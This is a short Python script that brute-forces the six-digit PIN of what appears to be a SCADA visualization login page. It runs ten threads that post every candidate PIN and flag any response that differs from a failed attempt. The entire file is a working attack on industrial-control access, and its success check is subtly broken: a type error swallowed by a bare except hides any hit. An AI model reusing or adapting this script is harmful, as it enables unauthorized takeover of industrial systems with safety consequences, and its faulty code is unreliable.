import requests
import urllib.request
import threading

target = "http://IP/scada-vis/pin?return=touch"



data = {'pin': '111000'}
test = requests.post(target, json = data)
x = test.text
def brute1():
	for i in range(0,100000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute2():
	for i in range(100000,200000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute3():
	for i in range(200000,300000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute4():
	for i in range(300000,400000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute5():
	for i in range(400000,500000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute6():
	for i in range(500000,600000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute7():
	for i in range(600000,700000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute8():
	for i in range(700000,800000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute9():
	for i in range(800000,900000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i +'YES')
				exit()
		except:
			pass
def brute10():
	for i in range(900000,1000000):
		try:
			data = {'pin': i}
			response = requests.post(target, json = data)
			if response.text == x:
				pass
			else:
				print(i + 'YES')
				exit()
		except:
			pass

t1 = threading.Thread(target=brute1)
t2 = threading.Thread(target=brute2)
t3 = threading.Thread(target=brute3)
t4 = threading.Thread(target=brute4)
t5 = threading.Thread(target=brute5)
t6 = threading.Thread(target=brute6)
t7 = threading.Thread(target=brute7)
t8 = threading.Thread(target=brute8)
t9 = threading.Thread(target=brute9)
t10 = threading.Thread(target=brute10)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()
